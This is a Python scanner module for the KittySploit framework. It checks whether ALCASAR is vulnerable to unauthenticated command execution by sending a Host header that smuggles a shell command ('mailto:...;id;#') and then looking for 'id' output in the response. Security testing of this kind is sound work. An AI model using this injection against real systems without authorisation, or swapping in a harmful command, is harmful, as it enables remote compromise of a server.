#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ALCASAR Host-header command injection."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ALCASAR - Host Header RCE Detection',
        'description': (
            'Detects ALCASAR RCE by injecting mailto:...;id;# into the Host header '
            'on /alcasar/index.php.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'alcasar', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/34866',
        ],
    }

    def run(self):
        for base in ('/alcasar', ''):
            probe = self.http_request(method='GET', path=f'{base}/index.php', allow_redirects=False)
            if not probe or 'ALCASAR' not in (probe.text or ''):
                continue
            token = self.random_text(6)
            # Host header injection as in NASL
            host_inj = f'mailto:{token}@ks.org;id;#'
            r = self.http_request(
                method='GET',
                path=f'{base}/index.php',
                headers={'Host': host_inj},
                allow_redirects=False,
            )
            if r and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='ALCASAR Host-header RCE',
                    path=f'{base}/index.php',
                )
                return True
        return False
